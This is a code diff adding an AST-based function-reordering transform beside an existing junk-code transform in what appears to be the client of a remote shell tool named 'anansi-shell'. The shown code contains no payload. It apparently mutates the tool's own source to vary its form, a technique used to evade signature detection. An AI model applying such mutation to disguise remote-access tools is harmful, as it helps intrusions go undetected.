@@ -315,6 +315,36 @@ def junk_transform(source):
     return head + "".join(lines) + tail
 
 
+def order_safe(node):
+    """reads no name."""
+    if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
+        return True
+    # junk reads nothing; top-level does
+    return all(isinstance(name, ast.Name) and isinstance(name.ctx, ast.Store)
+               for name in ast.walk(node) if isinstance(name, ast.Name))
+
+
+def reorder_transform(source):
+    """Shuffle region's blocks."""
+    head, region, tail = split_mutable(source)
+    tree = ast.parse(region)
+    defs = [node for node in tree.body
+            if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef))]
+    # defs only bind names; anything else at top
+    if len(defs) < 2 or not all(order_safe(node) for node in tree.body):
+        return source
+    lines = region.splitlines(keepends=True)
+    # junk glued to its def, each def keeps the lines above it
+    blocks = []
+    taken = 0
+    for node in defs:
+        above = [line for line in lines[taken:node.lineno - 1] if line.strip()]
+        blocks.append("".join(above) + "".join(lines[node.lineno - 1:node.end_lineno]))
+        taken = node.end_lineno
+    random.shuffle(blocks)
+    return head + "\n\n".join(blocks) + "".join(lines[taken:]) + tail
+
+
 def main():
     parser = argparse.ArgumentParser(description="anansi-shell client")
     parser.add_argument("--host")
